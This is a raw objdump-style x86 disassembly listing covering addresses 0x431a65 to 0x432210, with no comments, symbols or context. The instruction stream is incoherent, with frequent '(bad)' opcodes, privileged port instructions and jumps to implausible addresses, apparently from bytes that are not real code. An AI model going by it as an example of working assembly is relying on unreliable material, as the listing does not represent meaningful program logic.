  431a65:	scas   eax,DWORD PTR es:[edi]
  431a66:	ret    
  431a67:	mov    ecx,esi
  431a69:	hlt    
  431a6a:	(bad)  
  431a6b:	push   ebp
  431a6c:	scas   eax,DWORD PTR es:[edi]
  431a6d:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  431a73:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  431a79:	add    BYTE PTR [ebx],al
  431a7b:	mov    eax,eax
  431a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a7e:	inc    ebp
  431a7f:	dec    ebp
  431a80:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431a88:	inc    ebp
  431a89:	(bad)  
  431a8b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431a93:	sar    eax,1
  431a95:	rol    BYTE PTR [ebp+0x5],1
  431a98:	xor    eax,DWORD PTR [ebp+0x3]
  431a9b:	jmp    0x431a88
  431a9d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431aa3:	xor    eax,DWORD PTR [ebp+0x33]
  431aa6:	mov    eax,DWORD PTR [ebx]
  431aa8:	rol    BYTE PTR [ebx],1
  431aaa:	test   BYTE PTR [edi],cl
  431aac:	cdq    
  431aad:	shl    DWORD PTR [edx],0x4d
  431ab0:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431ab6:	xor    edx,eax
  431ab8:	add    eax,DWORD PTR ds:0xeb4d45e0
  431abe:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431ac4:	add    BYTE PTR [ebx],dh
  431ac6:	inc    ebp
  431ac7:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  431acd:	rdpmc  
  431acf:	rol    DWORD PTR [ebx],0x4d
  431ad2:	loopne 0x431a5f
  431ad4:	push   ebp
  431ad5:	in     al,dx
  431ad6:	mov    cl,dl
  431ad8:	adc    eax,edx
  431ada:	jb     0x431ae1
  431adc:	add    BYTE PTR [ebp+0x45],al
  431adf:	jmp    0x431a6c
  431ae1:	mov    ebx,eax
  431ae3:	test   al,0xcb
  431ae5:	dec    ebp
  431ae6:	dec    ebp
  431ae7:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  431aed:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431af3:	dec    ebp
  431af4:	mov    al,0x8b
  431af6:	dec    ebp
  431af7:	in     al,dx
  431af8:	xor    edx,ecx
  431afa:	xor    edx,eax
  431afc:	add    eax,DWORD PTR [ebp+0x3]
  431aff:	jbe    0x431b10
  431b01:	mov    eax,ecx
  431b03:	test   al,0x45
  431b05:	dec    ebp
  431b06:	mov    DWORD PTR [ebx],esi
  431b08:	loopne 0x431b3d
  431b0a:	inc    ebp
  431b0b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431b11:	rol    esi,0x45
  431b14:	scas   eax,DWORD PTR es:[edi]
  431b15:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  431b1b:	mov    eax,ecx
  431b1d:	hlt    
  431b1e:	dec    ebp
  431b1f:	inc    ebp
  431b20:	mov    eax,edi
  431b22:	loopne 0x431afc
  431b24:	retf   
  431b25:	test   esi,ecx
  431b27:	clc    
  431b28:	scas   eax,DWORD PTR es:[edi]
  431b29:	inc    ebp
  431b2a:	mov    eax,edi
  431b2c:	fdiv   st,st(0)
  431b2e:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  431b34:	cdq    
  431b35:	cmp    BYTE PTR [edx],dh
  431b37:	pushf  
  431b38:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  431b3e:	inc    esi
  431b40:	mov    ebp,DWORD PTR [eax-0x10]
  431b43:	inc    ebp
  431b44:	dec    ebp
  431b45:	xor    esi,DWORD PTR [ebx]
  431b47:	add    eax,DWORD PTR [ebx]
  431b49:	loopne 0x431b5a
  431b4b:	dec    ebp
  431b4c:	ror    DWORD PTR [edx+0x7233084d],0x3
  431b53:	add    BYTE PTR [ebx-0x7b740bbb],cl
  431b59:	lock cdq 
  431b5b:	ret    
  431b5c:	xor    al,BYTE PTR [ebp-0x77]
  431b5f:	mov    esi,esp
  431b61:	rol    BYTE PTR [ebp-0x7c],1
  431b64:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  431b6a:	call   edi
  431b6c:	enter  0x4d45,0x8b
  431b70:	mov    esi,eax
  431b72:	fmul   st(3),st
  431b74:	push   ebp
  431b75:	dec    ebp
  431b76:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  431b7c:	ret    0xc199
  431b7f:	xor    al,BYTE PTR [esi-0x280276]
  431b85:	dec    ebp
  431b86:	jne    0x431bbb
  431b88:	mov    eax,DWORD PTR [ebx]
  431b8a:	cld    
  431b8b:	loopne 0x431b3d
  431b8d:	push   ebp
  431b8e:	add    DWORD PTR [eax+0x72851100],ecx
  431b94:	inc    DWORD PTR [eax]
  431b96:	inc    DWORD PTR [ebp-0x75]
  431b99:	mov    edi,esp
  431b9b:	lock add bl,0x1
  431b9f:	retf   
  431ba0:	add    dh,al
  431ba2:	xor    dh,cl
  431ba4:	inc    ebp
  431ba5:	scas   eax,DWORD PTR es:[edi]
  431ba6:	mov    eax,DWORD PTR [ebx]
  431ba8:	shl    al,0x0
  431bab:	inc    ebp
  431bac:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431bb2:	call   0x462dea
  431bb7:	ud0    eax,ecx
  431bba:	adc    al,0x4d
  431bbc:	inc    ebp
  431bbd:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431bc3:	lock push 0x338055
  431bc9:	add    eax,DWORD PTR [eax]
  431bcb:	ud0    ecx,edx
  431bce:	sbb    BYTE PTR [ebp+0x5e],dl
  431bd1:	xor    ecx,ecx
  431bd3:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431bda:	push   ecx
  431bdb:	add    BYTE PTR [ebp-0x38],cl
  431bde:	mov    DWORD PTR [esi-0x740004],eax
  431be4:	cld    
  431be5:	inc    ebp
  431be6:	nop
  431be7:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431bed:	xabort 0xaf
  431bf0:	icebp  
  431bf1:	mov    esi,DWORD PTR [ebp-0x28]
  431bf4:	(bad)  
  431bf5:	retf   
  431bf6:	or     ecx,eax
  431bf8:	(bad)  
  431bf9:	dec    ebp
  431bfa:	pop    es
  431bfb:	(bad)  
  431bfc:	(bad)  
  431bfd:	or     BYTE PTR [esi],al
  431bff:	jb     0x431bc7
  431c01:	add    BYTE PTR [ebx],al
  431c03:	inc    ebp
  431c04:	(bad)  
  431c05:	mov    ecx,DWORD PTR [edx]
  431c07:	fadd   st(6),st
  431c09:	ret    
  431c0a:	add    ah,BYTE PTR [edi-0x37]
  431c0d:	int    0x55
  431c0f:	sub    ebp,esp
  431c11:	add    edx,DWORD PTR [ecx-0x14]
  431c14:	inc    ebp
  431c15:	inc    ebp
  431c16:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431c1c:	cld    
  431c1d:	(bad)  
  431c1e:	mov    WORD PTR [edi+0xf893be0],gs
  431c24:	mov    ebp,ebp
  431c26:	clc    
  431c27:	push   eax
  431c29:	push   DWORD PTR [ebp-0x4]
  431c2c:	mov    BYTE PTR [ebp+0xa],0xff
  431c30:	(bad)  
  431c31:	int3   
  431c32:	or     BYTE PTR [eax],al
  431c34:	(bad)  
  431c35:	lea    eax,[edi]
  431c37:	ins    BYTE PTR es:[edi],dx
  431c38:	(bad)  
  431c39:	inc    DWORD PTR [ecx]
  431c3b:	push   eax
  431c3c:	mov    BYTE PTR [ebp+0x9],0x8b
  431c40:	leave  
  431c41:	les    edx,FWORD PTR [ebp+0x0]
  431c44:	in     al,dx
  431c45:	call   DWORD PTR [ecx-0x75]
  431c48:	inc    ebp
  431c49:	cld    
  431c4a:	mov    DWORD PTR [eax+0x8b01fc],eax
  431c50:	cld    
  431c51:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431c57:	std    
  431c58:	mov    eax,DWORD PTR [eax]
  431c5a:	clc    
  431c5b:	test   eax,esi
  431c5d:	je     0x431cd4
  431c5f:	mov    eax,esi
  431c61:	cld    
  431c62:	add    al,0x80
  431c64:	add    WORD PTR [ecx+0x0],ax
  431c68:	fiadd  DWORD PTR [eax]
  431c6a:	mov    BYTE PTR [eax],0xd6
  431c6d:	push   0xffffffc3
  431c6f:	push   edi
  431c70:	mov    edx,DWORD PTR [eax+0x51]
  431c73:	pop    edi
  431c74:	lea    ebx,[ebx-0x8]
  431c77:	ret    0x45
  431c7a:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431c80:	xchg   eax,edi
  431c82:	mov    DWORD PTR [ebp-0x75],ecx
  431c85:	push   esi
  431c86:	clc    
  431c87:	jne    0x431c59
  431c89:	mov    ecx,0xf8450b0b
  431c8e:	(bad)  
  431c8f:	push   cs
  431c90:	or     BYTE PTR [ebp-0x3a],dh
  431c93:	cmp    eax,DWORD PTR [ecx]
  431c95:	pop    esi
  431c96:	(bad)  
  431c97:	or     al,0x5
  431c99:	inc    eax
  431c9a:	leave  
  431c9b:	jmp    0x40cf:0x21564204
  431ca2:	leave  
  431ca3:	jmp    0xdace5da7
  431ca8:	mov    eax,DWORD PTR [edx-0x3a]
  431cab:	jle    0x431ca3
  431cad:	inc    eax
  431cae:	nop
  431caf:	in     al,dx
  431cb0:	inc    ebx
  431cb2:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431cb8:	add    eax,0xff45e8f8
  431cbd:	push   esi
  431cbe:	push   DWORD PTR [ebp-0x39]
  431cc1:	mov    eax,0x7e9da46
  431cc6:	or     al,0x6
  431cc8:	push   DWORD PTR [ebp-0x3a]
  431ccb:	cmp    eax,DWORD PTR [edx]
  431ccd:	pop    esi
  431cce:	ret    
  431ccf:	or     al,0x56
  431cd1:	inc    ecx
  431cd2:	push   ebp
  431cd3:	jle    0x431cc1
  431cd5:	inc    edx
  431cd6:	inc    ebp
  431cd7:	leave  
  431cd8:	add    DWORD PTR [ecx+0x28],eax
  431cdb:	and    esp,edi
  431cdd:	inc    ecx
  431cde:	jne    0x431cc7
  431ce0:	add    DWORD PTR [edx+0x1c],eax
  431ce3:	retf   0xc38b
  431ce6:	adc    al,0x8b
  431ce8:	xchg   edx,eax
  431ce9:	push   ecx
  431cea:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431cf0:	rcl    DWORD PTR [esi-0x9],cl
  431cf3:	jne    0x431d45
  431cf5:	mov    eax,0x7c80ece
  431cfa:	rol    DWORD PTR [esi],cl
  431cfc:	div    DWORD PTR [ebp+0x50]
  431cff:	cmp    ecx,edx
  431d01:	pop    esi
  431d02:	dec    BYTE PTR [edx]
  431d04:	in     al,dx
  431d05:	inc    edx
  431d06:	sub    ebp,ebp
  431d08:	inc    eax
  431d09:	(bad)  
  431d0a:	push   eax
  431d0b:	add    edx,DWORD PTR [eax-0x13]
  431d0e:	push   edi
  431d0f:	add    dh,dh
  431d11:	leave  
  431d12:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431d16:	add    BYTE PTR [ecx+0x0],dl
  431d19:	inc    ebp
  431d1a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431d20:	add    BYTE PTR [eax-0x7fbf448],bh
  431d26:	add    al,0x2
  431d28:	jmp    0x57ec882
  431d2d:	jne    0x431d17
  431d2f:	mov    eax,DWORD PTR [edx]
  431d31:	or     BYTE PTR [eax],al
  431d33:	inc    ecx
  431d34:	stc    
  431d35:	jmp    0xe7825d70
  431d3a:	jge    0x431d7d
  431d3c:	mov    esi,ebp
  431d3e:	lock ret 0x7d
  431d42:	and    ecx,DWORD PTR [ebx-0x171777]
  431d48:	add    bh,bh
  431d4a:	aad    0xd7
  431d4c:	add    dh,cl
  431d4e:	clts   
  431d50:	(bad)  
  431d51:	call   0xffce1c56
  431d56:	hlt    
  431d57:	iret   
  431d58:	jge    0x431d30
  431d5a:	rol    DWORD PTR [esi-0x80],cl
  431d5d:	cmc    
  431d5e:	or     BYTE PTR [edi-0x27],cl
  431d61:	(bad)  
  431d62:	out    dx,al
  431d63:	mov    eax,DWORD PTR [ebx]
  431d65:	(bad)  
  431d66:	pop    esi
  431d67:	push   es
  431d68:	cmp    al,0xe8
  431d6a:	sar    edi,0x8
  431d6d:	inc    DWORD PTR [edi]
  431d6f:	inc    esi
  431d70:	(bad)  
  431d71:	in     al,dx
  431d72:	jle    0x431dcb
  431d74:	push   cs
  431d75:	push   ebx
  431d76:	add    BYTE PTR [ebx+0x24008b56],cl
  431d7c:	add    BYTE PTR [ebp+0x50],al
  431d7f:	push   eax
  431d80:	add    DWORD PTR [ebx+0x757d1834],ecx
  431d86:	sub    edx,DWORD PTR [esi-0x24]
  431d89:	jne    0x431d41
  431d8b:	lods   eax,DWORD PTR ds:[esi]
  431d8c:	mov    edx,DWORD PTR [edx-0x34]
  431d8f:	dec    esi
  431d90:	out    0x83,eax
  431d92:	into   
  431d93:	push   edi
  431d95:	loopne 0x431d65
  431d97:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431d9b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431da2:	rol    DWORD PTR [edx],0x8
  431da5:	mov    esp,ecx
  431da7:	cmp    DWORD PTR [ebx],0xc
  431daa:	mov    esi,0x5001c0
  431daf:	push   eax
  431db0:	push   cs
  431db1:	push   eax
  431db2:	(bad)  
  431db3:	sub    edx,edi
  431db5:	push   esi
  431db6:	adc    al,0xcb
  431db8:	ins    DWORD PTR es:[edi],dx
  431db9:	mov    eax,0x203e8
  431dbe:	add    al,ah
  431dc0:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431dc7:	add    dh,al
  431dc9:	add    ah,ch
  431dcb:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431dd1:	pop    ecx
  431dd2:	or     eax,ebx
  431dd4:	cli    
  431dd5:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431ddb:	lea    ebp,[ebx]
  431ddd:	mov    edx,DWORD PTR [edx-0x4]
  431de0:	dec    ecx
  431de1:	inc    ebp
  431de2:	shr    BYTE PTR [ebx],0x4b
  431de5:	and    al,0x0
  431de7:	(bad)  
  431de8:	jne    0x431e2f
  431dea:	pop    eax
  431deb:	mov    al,0x5a
  431ded:	call   0x142204c
  431df2:	and    al,0x85
  431df4:	push   edx
  431df5:	add    BYTE PTR [eax+eax*1+0x0],ah
  431df9:	dec    ebp
  431dfa:	mov    cl,0x23
  431dfc:	jmp    0x431dea
  431dfe:	mov    al,0xe7
  431e00:	call   0x13920ee
  431e05:	shr    DWORD PTR [eax+ebx*2],cl
  431e08:	lock (bad) 
  431e0a:	adc    eax,0x757f008d
  431e0f:	out    0x58,eax
  431e11:	cmp    al,0x7
  431e13:	pop    edx
  431e14:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431e1b:	push   ecx
  431e1c:	cld    
  431e1d:	mov    esi,0x3b0175
  431e22:	and    al,0xb0
  431e24:	xor    BYTE PTR [edx+0x1],0x8b
  431e28:	add    ah,bh
  431e2a:	mov    edi,DWORD PTR [ebp-0x4]
  431e2d:	psubsw mm7,QWORD PTR [edi]
  431e30:	add    DWORD PTR [ebp+0x0],ebp
  431e33:	rcr    eax,1
  431e35:	mov    edi,ecx
  431e37:	and    eax,DWORD PTR [eax]
  431e39:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431e3f:	call   0x1302128
  431e44:	add    al,cl
  431e46:	mov    ebp,esi
  431e48:	aam    0x83
  431e4a:	or     DWORD PTR [ecx],eax
  431e4c:	jne    0x431e3f
  431e4e:	mov    eax,DWORD PTR [eax]
  431e50:	aam    0x0
  431e52:	dec    ebp
  431e53:	jne    0x431de0
  431e55:	cmp    ebx,eax
  431e57:	jb     0x431ea6
  431e59:	jmp    0x431de6
  431e5b:	mov    ebx,esp
  431e5d:	int3   
  431e5e:	dec    ebp
  431e5f:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431e66:	mov    edx,0x8b0a8b
  431e6b:	cmp    ecx,DWORD PTR [eax]
  431e6d:	jb     0x431e46
  431e6f:	pop    edx
  431e70:	push   edi
  431e71:	cli    
  431e72:	pop    es
  431e73:	mov    eax,ecx
  431e75:	jb     0x431e79
  431e77:	add    DWORD PTR [ebx],0xa
  431e7a:	mov    eax,DWORD PTR [ebx]
  431e7c:	int3   
  431e7d:	add    bh,BYTE PTR [esi+0x75d10006]
  431e83:	jmp    0x431e10
  431e85:	mov    al,0xe8
  431e87:	call   0x1042109
  431e8c:	add    edx,DWORD PTR [ecx+ecx*8]
  431e8f:	pop    edi
  431e90:	or     BYTE PTR [ecx-0x73],bl
  431e93:	pop    ecx
  431e94:	inc    edi
  431e95:	xor    al,0xeb
  431e97:	push   ecx
  431e98:	mov    edi,DWORD PTR [edx+0xc506cc]
  431e9e:	call   0xb21fa3
  431ea3:	int3   
  431ea4:	sbb    BYTE PTR [esi],ch
  431ea6:	inc    ebp
  431ea7:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431ead:	call   0x9c211c
  431eb2:	or     BYTE PTR [ebx-0x73],dl
  431eb5:	cmp    al,0x47
  431eb7:	mov    al,0x1
  431eb9:	jb     0x431ebb
  431ebb:	mov    al,0x10
  431ebd:	push   eax
  431ebe:	add    al,0x75
  431ec0:	add    BYTE PTR [ebx],ch
  431ec2:	add    ebx,esp
  431ec4:	int3   
  431ec5:	jne    0x431ed7
  431ec7:	movsx  edx,cl
  431eca:	add    DWORD PTR [eax],eax
  431ecc:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431ed3:	mov    gs,edi
  431ed5:	add    BYTE PTR [eax-0x50],ch
  431ed8:	add    al,ch
  431eda:	mov    eax,DWORD PTR [ecx]
  431edc:	sub    eax,DWORD PTR [eax]
  431ede:	jb     0x431f55
  431ee0:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431ee4:	jge    0x431ece
  431ee6:	add    al,0x1
  431ee8:	add    DWORD PTR [eax],0x0
  431eeb:	jne    0x431eed
  431eed:	je     0x431f34
  431eef:	mov    eax,DWORD PTR [edi]
  431ef1:	ror    BYTE PTR [ebp+0x4d],1
  431ef4:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431efb:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431f01:	mov    DWORD PTR [ebx],ebp
  431f03:	fadd   DWORD PTR [eax+0x75]
  431f06:	inc    eax
  431f07:	pop    eax
  431f08:	lea    ebx,[ecx+0x4f]
  431f0b:	push   0xb1000003
  431f10:	out    dx,eax
  431f11:	add    ebp,DWORD PTR [edx+edx*2]
  431f14:	add    BYTE PTR [ebx+ecx*4],bh
  431f17:	mov    ch,BYTE PTR [ebx]
  431f19:	jb     0x431f8d
  431f1b:	add    al,0x89
  431f1d:	push   eax
  431f1e:	call   0x842b6c90
  431f23:	add    DWORD PTR [eax+eax*1],eax
  431f26:	jae    0x431f3c
  431f28:	icebp  
  431f29:	inc    ebp
  431f2a:	mov    eax,DWORD PTR gs:[ecx]
  431f2d:	int3   
  431f2e:	out    dx,al
  431f2f:	loopne 0x431f7e
  431f31:	sub    eax,DWORD PTR [edx]
  431f33:	push   0xffffff83
  431f35:	pop    esi
  431f36:	push   cs
  431f37:	jl     0x431f52
  431f39:	add    al,0xaf
  431f3b:	xor    eax,0x832b6d00
  431f40:	mov    eax,DWORD PTR [edx]
  431f42:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431f48:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431f4e:	inc    ebp
  431f4f:	shr    ebx,0x3
  431f52:	or     DWORD PTR [eax],0x4
  431f55:	push   0xffffffa5
  431f57:	pop    esi
  431f58:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431f5f:	jmp    0x431fbe
  431f61:	mov    edi,0xff0272
  431f66:	fdivr  QWORD PTR [ebp+0x5d]
  431f69:	push   0x4e
  431f6b:	pop    ecx
  431f6c:	call   0x436371
  431f71:	mov    DWORD PTR [ebx],eax
  431f73:	in     al,0xc8
  431f75:	rol    BYTE PTR [ebp-0x75],0xc1
  431f79:	call   0xad215a
  431f7e:	pop    esi
  431f7f:	enter  0xceff,0x8b
  431f83:	repz mov ecx,DWORD PTR [ebp-0x34]
  431f87:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431f8e:	je     0x431f90
  431f90:	or     DWORD PTR [ebx-0x74183b24],eax
  431f96:	jne    0x431f7c
  431f98:	jmp    0x431f93
  431f9a:	push   DWORD PTR [edx-0x24]
  431f9d:	push   0x4d
  431f9f:	pop    ecx
  431fa0:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431fa4:	jge    0x431fac
  431fa6:	mov    eax,eax
  431fa8:	sub    ebp,DWORD PTR [edx+0x24]
  431fab:	pop    esi
  431fac:	inc    ebp
  431fad:	mov    esp,0x8b6077
  431fb2:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431fb8:	lods   al,BYTE PTR ds:[esi]
  431fb9:	add    BYTE PTR [ebx],bh
  431fbb:	enter  0xce73,0x49
  431fbf:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431fc7:	stc    
  431fc8:	jge    0x43203c
  431fca:	jnp    0xdd42a339
  431fd0:	call   0xc620a6
  431fd5:	fadd   st(0),st
  431fd7:	dec    esi
  431fd8:	ins    BYTE PTR es:[edi],dx
  431fd9:	stc    
  431fda:	cmp    al,0x73
  431fdc:	push   ebp
  431fdd:	mov    eax,0xf8028b
  431fe2:	jne    0x431fa5
  431fe4:	mov    esi,ecx
  431fe6:	mov    esp,DWORD PTR [ebp+0x2c]
  431fe9:	add    edi,DWORD PTR [ebp-0x24]
  431fec:	sub    esp,eax
  431fee:	and    al,0x45
  431ff0:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431ff6:	sbb    al,0xee
  431ff8:	pop    esi
  431ff9:	call   0x832029
  431ffe:	fsubr  st,st(3)
  432000:	sti    
  432001:	add    BYTE PTR gs:[ecx],bh
  432004:	add    eax,esp
  432006:	add    DWORD PTR [esi],eax
  432008:	rol    DWORD PTR [ebp+0x8],0x29
  43200c:	mov    esp,eax
  43200e:	clc    
  43200f:	jne    0x432086
  432011:	mov    eax,0x8b0673
  432016:	loopne 0x43205d
  432018:	loopne 0x431fa3
  43201a:	lods   al,BYTE PTR ds:[esi]
  43201b:	int3   
  43201c:	inc    ebp
  43201d:	mov    DWORD PTR gs:[eax+edi*8],eax
  432021:	add    al,0xc3
  432023:	sub    ecx,DWORD PTR [ebp+0x47]
  432026:	(bad)  
  432028:	shr    BYTE PTR [ebp-0x1f],0xe8
  43202c:	add    eax,DWORD PTR [eax]
  43202e:	call   0x644e133
  432033:	add    esi,DWORD PTR [esi-0x3b2efc83]
  432039:	dec    esi
  43203a:	ins    DWORD PTR es:[edi],dx
  43203b:	in     al,dx
  43203c:	lea    eax,[eax]
  43203e:	inc    ebp
  43203f:	inc    ebp
  432040:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  432046:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  432050:	and    al,0xdc
  432052:	ror    DWORD PTR [edx+0x24],0xf7
  432056:	or     BYTE PTR [ebp+0x4c],dh
  432059:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43205d:	stos   BYTE PTR es:[edi],al
  43205e:	adc    edx,edi
  432060:	inc    esp
  432061:	add    edi,DWORD PTR [eax]
  432063:	jne    0x432048
  432065:	mov    DWORD PTR [eax-0x7449db04],ecx
  43206b:	cmp    ecx,DWORD PTR [edi]
  43206d:	sub    BYTE PTR [ebp-0x7e],dl
  432070:	sar    ebp,0xb
  432073:	jmp    FWORD PTR [edi+0x2400392a]
  432079:	sub    esi,DWORD PTR [ebx-0x73]
  43207c:	mov    esp,DWORD PTR [ecx+edi*4]
  43207f:	mov    ecx,DWORD PTR [eax]
  432081:	and    BYTE PTR [eax],al
  432083:	jne    0x43204f
  432085:	sub    ebp,ecx
  432087:	sbb    BYTE PTR [esi+0x32],ah
  43208a:	dec    ebp
  43208b:	push   ebp
  43208c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  432092:	ret    
  432093:	mov    edx,ebp
  432095:	leave  
  432096:	sub    DWORD PTR [esi+0x24],ebx
  432099:	ret    0x2b
  43209c:	pop    ax
  43209e:	push   ebp
  43209f:	rol    BYTE PTR [ebx],0xeb
  4320a2:	add    DWORD PTR [ecx+0x6c0001],0x40
  4320a9:	jb     0x432100
  4320ab:	ret    
  4320ac:	in     al,dx
  4320ad:	jecxz  0x43203a
  4320af:	push   esi
  4320b0:	xchg   esp,eax
  4320b1:	jne    0x4320b3
  4320b3:	cmp    edx,DWORD PTR [esi+0x1c]
  4320b6:	jne    0x43209c
  4320b8:	mov    eax,DWORD PTR [ebp-0x77]
  4320bb:	ror    DWORD PTR [ebx+0x899408],0xe0
  4320c2:	mov    esi,DWORD PTR [ebp-0x75]
  4320c5:	pop    esi
  4320c6:	nop
  4320c7:	mov    eax,DWORD PTR [eax]
  4320c9:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4320cf:	add    al,0x0
  4320d1:	inc    ebp
  4320d2:	mov    eax,DWORD PTR [ebx]
  4320d4:	mov    ebp,ebx
  4320d6:	cmp    al,0xf
  4320d8:	or     al,al
  4320da:	inc    ebp
  4320db:	inc    ebp
  4320dc:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  4320e4:	mov    bh,0xc0
  4320e6:	push   ss
  4320e7:	ins    BYTE PTR es:[edi],dx
  4320e8:	push   ecx
  4320e9:	add    BYTE PTR [ecx-0x5],dl
  4320ec:	add    eax,0x17200
  4320f1:	sbb    al,0x85
  4320f3:	dec    esp
  4320f4:	je     0x43212e
  4320f6:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4320fa:	add    BYTE PTR [ebx],bh
  4320fc:	(bad)  
  4320fd:	and    al,0x39
  4320ff:	jae    0x43209d
  432101:	mov    cl,cl
  432103:	inc    DWORD PTR [esp]
  432106:	push   ebp
  432107:	shr    esp,0x8
  43210a:	in     al,dx
  43210b:	push   esp
  43210c:	add    DWORD PTR [eax],esp
  43210e:	add    bl,cl
  432110:	inc    ebp
  432111:	mov    bh,0x89
  432113:	add    ah,bh
  432115:	jmp    0xca7c305f
  43211a:	pushf  
  43211b:	dec    esp
  43211c:	mov    edx,0xf8178520
  432121:	fst    DWORD PTR [ebp+0x0]
  432124:	mov    BYTE PTR [eax],0xc4
  432127:	sub    edx,DWORD PTR [ebx-0x3f]
  43212a:	inc    ebp
  43212b:	add    eax,0xc601da
  432130:	mov    al,0xc6
  432133:	ins    BYTE PTR es:[edi],dx
  432134:	mov    DWORD PTR [eax+0x57],0x280545c1
  43213b:	dec    esp
  43213c:	jmp    DWORD PTR [eax]
  43213e:	inc    ebp
  43213f:	fnstcw WORD PTR [esi+0x29]
  432142:	test   BYTE PTR [eax],0xc6
  432145:	rol    BYTE PTR [eax],0xc0
  432148:	lea    ecx,[ebp-0x3cf0dbcb]
  43214e:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  432154:	inc    esi
  432155:	add    DWORD PTR [eax],ebx
  432157:	add    dh,bh
  432159:	mov    esi,DWORD PTR [edx+0x8]
  43215c:	(bad)  
  43215d:	fdiv   QWORD PTR ss:[ecx]
  432160:	(bad)  
  432161:	mov    bl,ch
  432163:	add    esi,eax
  432165:	add    dh,bl
  432167:	or     esi,eax
  432169:	mov    dl,0xdf
  43216b:	add    esi,eax
  43216d:	add    al,ah
  43216f:	push   cs
  432170:	mov    BYTE PTR [edx+0xc601e1],0xe2
  432177:	or     BYTE PTR [ebx],dh
  432179:	dec    ecx
  43217a:	lea    eax,[ebx]
  43217c:	xor    eax,0x18fc0fc7
  432181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432182:	repz clc 
  432184:	add    eax,DWORD PTR [ebp+0x46]
  432187:	prefetcht0 BYTE PTR [ecx-0x2]
  43218b:	xor    eax,0x7c60872
  432190:	mov    esp,0xbd32c699
  432195:	pop    esi
  432196:	mov    cl,0xbe
  432199:	or     al,0xc6
  43219b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4321a2:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4321a9:	add    dh,al
  4321ab:	mov    eax,ebx
  4321ad:	xor    DWORD PTR [ebx],0x35008dbc
  4321b3:	mov    ecx,DWORD PTR [edi]
  4321b5:	sbb    al,0x18
  4321b7:	inc    ebp
  4321b8:	xrelease mov DWORD PTR [ebx],0x188546f4
  4321bf:	clc    
  4321c0:	(bad)  
  4321c1:	ss jb  0x432160
  4321c4:	lea    ecx,[ecx+0x45ffe838]
  4321ca:	mov    ebp,esp
  4321cc:	fadd   st,st(6)
  4321ce:	dec    ebp
  4321cf:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4321d5:	out    0x1,eax
  4321d7:	inc    ebp
  4321d8:	lea    ebp,[ecx]
  4321da:	inc    esi
  4321dc:	dec    eax
  4321de:	enter  0xa33,0xc6
  4321e2:	push   ebp
  4321e3:	leave  
  4321e4:	(bad)  
  4321e5:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4321eb:	add    BYTE PTR [ebp+0x44],al
  4321ee:	mov    eax,esp
  4321f0:	mov    WORD PTR [esi+0x44398300],?
  4321f6:	psubusw mm4,QWORD PTR [eax-0x78]
  4321fa:	add    BYTE PTR [ebx-0x1303f975],al
  432200:	add    BYTE PTR [ebp+0x1],0xeb
  432204:	add    BYTE PTR [ebp+0x38],al
  432207:	jmp    0xdbce6751
  43220c:	add    BYTE PTR [ebp+0x0],0xe8
  432210:	mov    DWORD PTR [ebp-0x48],eax
